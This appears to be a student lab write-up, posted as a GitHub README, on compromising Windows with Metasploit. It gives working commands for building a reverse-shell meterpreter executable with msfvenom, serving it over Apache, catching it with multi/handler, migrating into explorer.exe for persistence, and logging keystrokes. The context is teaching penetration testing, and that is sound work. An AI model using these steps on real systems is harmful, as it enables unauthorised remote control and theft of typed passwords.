# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/7ada33d2-4768-4cc7-a155-bc020fa8db58)

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/bf15930d-cd6a-47b2-9a09-4b47e86730ab)

copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/ca7dc7eb-517b-4b6e-8564-b605a98c2113)


Start apache server
sudo systemctl apache2 start
![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/8bbf3262-620a-4329-b345-5e86a9ccdb08)

Check the status of apache2
![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/9bc2b719-8f5d-4684-9489-1e3a4b8fd972)

Invoke msfconsole:
## OUTPUT:

![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/1f235765-5c2f-401f-bf6c-6ea482f0be0b)



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/e960726a-4a92-4876-81a8-b666041cc488)


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/9d62c698-0441-4293-8aa1-6c5013236279)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/535ba05a-da29-48f5-9b30-ef1028573369)


Bypass any warning boxes, double-click the file, and allow it to run.
![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/5c31d3b4-7e75-442f-8f25-fef64d0b2d11)

On kali give the command exploit
![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/3a92b09f-4dd9-4c03-9c46-eea4fde9aaca)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/9e3aeb22-ebc2-47ef-88bb-fa96fb800d64)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/99923d38-7cf4-475b-97c7-416d29e9911c)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.


keyscan_dump	Shows the keystrokes captured so far
![image](https://github.com/CodesWithRobi/EH-Compromising-windows-using-Metasploit/assets/130537166/f6fce01d-00aa-4726-b6a1-97902bc1dffb)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
